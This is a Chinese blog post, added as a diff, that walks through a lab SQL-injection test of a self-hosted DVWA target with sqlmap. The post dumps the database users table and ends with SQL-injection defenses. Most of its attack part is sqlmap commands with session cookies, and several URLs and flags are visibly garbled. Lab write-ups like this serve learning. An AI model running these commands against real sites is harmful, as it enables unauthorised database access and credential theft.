@@ -1,0 +1,193 @@
+---
+layout:     post
+title:      "一次sql注入测试"
+subtitle:   " \" 软件测试\""
+date:       2023-12-12 17:50:12
+author:     "yangsir"
+header-img: "img/post-bg-2015.jpg"
+catalog: true
+tags:
+    - Meta
+    - 渗透测试
+
+
+---
+
+> “Yeah It's on. ”
+
+
+<p id = "build"></p>
+
+## 利用sqlmap对测试站点进行sql注入并获得后台管理员admin账号和密码
+
+
+
+**该方案仅用于个人学习,所有环境均为自己搭建**
+
+**《中华人民共和国刑法》**
+
+**非法侵入计算机信息系统罪和非法控制计算机信息系统罪。未经许可侵入他人计算机信息系统或者非法控制他人计算机信息系统，情节严重的，可以被追究刑事责任。**
+
+
+
+测试环境：
+
+​      Linux两台
+
+
+
+![image-20231212165831001](\img\springBoot\image-20231212165831001.png)
+
+sql注入概述:
+
+所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。
+
+它是利用现有应用程序，可以通过在 Web 表单中输入(恶意)SQL 语得到一个存在安全漏洞的网站上的数据库。*
+
+比如先前的很多影视网站泄露 VIP 会员码大多就是通过 WEB 表单递交查询字符暴出的，这类表单特别容易受到 SQL注入式攻击。
+
+什么是SQLmap?
+
+SQLmap 是一款用来检测与利用 SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理(数据库指纹、访问底层文件系统、执行命令)。
+
+![image-20231212165916196](\img\springBoot\image-20231212165916196.png)
+
+Sqlmap已经安装完毕
+
+![image-20231212165939246](\img\springBoot\image-20231212165939246.png)
+
+目标站点
+
+test.iximp.top/index.php
+
+DVWA靶场
+
+DVWA靶场是一个用于安全研究人员和开发人员进行安全测试和教学的开源Web应用程序。DVWA全称是Damn Vulnerable Web Application，即“极易受攻击的Web应用程序”。
+
+这个应用程序具有很多已知的安全漏洞，如SQL注入、跨站脚本攻击（XSS）、不安全的直接对象引用等。用户可以在这个应用程序中尝试各种攻击技术，以便更好地理解这些漏洞的工作原理，如何防御它们，以及如何在自己的代码中避免这些漏洞。
+
+DVWA靶场是一个非常有用的工具，可以帮助开发人员和安全专业人员提高他们的安全知识和技能。
+
+
+
+## 测试开始
+
+登录网站获取cookie
+
+![image-20231212170022337](\img\springBoot\image-20231212170022337.png)
+
+
+
+
+
+使用sqlmap检索当前数据库和当前用户
+
+```shell
+sqlmap -u "https://test.iximp.top/vulnerabilities/sqli/?id=22&Submit=Submit" --cookie='PHPSESSID=9jnc4mmla0tggst2v2f73esna2; security=low' -b --current-db --current-user
+```
+
+![image-20231212173743924](\img\springBoot\image-20231212173743924.png)
+
+扫描成功
+
+-u 指定URL
+
+--cookie指定cookie
+
+-b 获取DBMSbanner
+
+--current-db 获取当前数据库
+
+--current-user获取当前用户
+
+
+
+枚举所有mysql的用户和密码hash值，后期可以对密码进行破解，生成明文密码
+
+```shell
+sqlmap -u "https://test.iximp.top/vulnerabilities/sqli/?id=10&Submit=Submit" --cookie='PHPSESSID=tllqn7te36c7n42vsbn72hiob7; security=low' --string ="Surname" --users –password
+
+
+```
+
+
+
+枚举所有数据库名
+
+```shell
+sqlmap -u "https://test.ixt.iximp.top/vulnerabilities/sqli/?id=10&Submit=Submit" --cookie='PHPSESSID=tllqn7te36c7n42vsbn72hiob7; security=low' –dbs
+```
+
+![image-20231212174022983](\img\springBoot\image-20231212174022983.png)
+
+枚举dvwa数据库中的所有表名
+
+```shell
+sqlmap -u "https://test.iximp.top/vulnerabilities/sqli/?id=10&Submit=Submit" --cookie='PHPSESSID=tllqn7te36c7n42vsbn72hiob7; security=low' --string ="Surname" -D dvwa --tables
+
+```
+
+![image-20231212174039296](\img\springBoot\image-20231212174039296.png)
+
+枚举字段名
+
+```shell
+sqlmap -u "https://test.est.iximp.top/vulnerabilities/sqli/?id=10&Submit=Submit" --cookie='PHPSESSID=tllqn7te36c7n42vsbn72hiob7; security=low' --string ="Surname" -D dvwa -T users --columns 
+```
+
+
+
+提取user表中的用户名和密码等信息，将用户与密码表中的所有用户名与密码dump出来
+
+```shell
+sqlmap -u "https://test.iximp.top/top/vulnerabilities/sqli/?id=10&Submit=Submit" --cookie='PHPSESSID=tllqn7te36c7n42vsbn72hiob7; security=low' --string ="Surname" -D dvwa -T users -C user,password –dump
+```
+
+
+
+![image-20231212174203975](\img\springBoot\image-20231212174203975.png)
+
+
+
+提取出来后，默认将文件放在了/root/.local/share/sqlmap/output/test.iximp.top/dump/dvwa/users.csv中
+
+
+
+```shell
+cat /root/.local/share/sqlmap/output/test.iximp.top/dump/dvwa/users.csv
+```
+
+
+
+![image-20231212174345922](\img\springBoot\image-20231212174345922.png)
+
+
+
+托库成功！！！
+
+
+
+### 此次实验步骤：
+
+1. 在DVWA靶场中设置安全级别为低级，选择SQL漏洞进行测试。
+2. 使用浏览器访问DVWA靶场，获取到可能存在SQL注入的URL。
+3. 使用sqlmap工具，对获取到的URL进行SQL注入测试。
+4. sqlmap工具在测试过程中发现了SQL注入漏洞，进一步利用该漏洞获取到数据库信息。
+5. 利用sqlmap工具，对数据库进行深度挖掘，最终成功获取到后台管理员admin的账号和密码。
+
+### 如何有效避免SQL注入
+
+1. 预编译SQL语句：预编译SQL语句可以保证所有的SQL语句在执行前都已经被数据库服务器解析，这样就无法插入恶意的SQL代码。
+2. 参数化查询：参数化查询也是一种防止SQL注入的有效手段。它将查询和数据分开，让数据库只解析查询，而不解析数据，这样就不会触发SQL注入。
+3. 用户输入验证：对用户的输入进行严格的验证，如长度、类型和语法检查，以及对特殊字符进行转义处理。
+4. 使用最小权限原则：应用程序连接数据库的账户权限应该限制在最小，只有执行特定任务所需的权限。
+
+
+
+### 实验结果：
+
+成功利用SQL注入漏洞，获取到了后台管理员admin的账号和密码。
+
+### 实验总结： 
+
+通过本次实验，我们深入理解了SQL注入攻击的原理和过程，掌握了使用sqlmap工具进行SQL注入测试的方法，提高了我们的安全防护能力。同时，我们也认识到，开发过程中需要严格遵守编程规范，对用户输入进行严格的过滤和检查，防止恶意攻击。此外，定期进行安全测试和漏洞扫描，及时发现和修复安全漏洞，也是保障系统安全的重要手段。
